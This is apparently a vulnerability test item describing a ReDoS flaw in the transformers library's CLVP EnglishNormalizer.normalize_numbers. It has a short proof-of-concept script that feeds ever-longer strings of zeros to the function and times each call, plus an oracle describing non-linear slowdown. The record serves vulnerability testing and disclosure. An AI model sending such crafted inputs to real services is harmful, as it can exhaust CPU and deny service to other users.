title: Inefficient regular expression in EnglishNormalizer.normalize_numbers causes ReDoS via crafted numeric input
trigger_payload:
from transformers.models.clvp.number_normalizer import EnglishNormalizer
import sys
import time
normalizer = EnglishNormalizer()
sys.set_int_max_str_digits(100000)
for i in range(1, 100000, 10000):
    payload = '0' * i
    start = time.perf_counter()
    normalizer.normalize_numbers(payload)
    end = time.perf_counter()
    execution_time = end - start
    print(f'Payload length {i}, execution time: {execution_time:.4f} seconds')
oracle: Non-linear increase in execution time with input length, indicating excessive CPU consumption
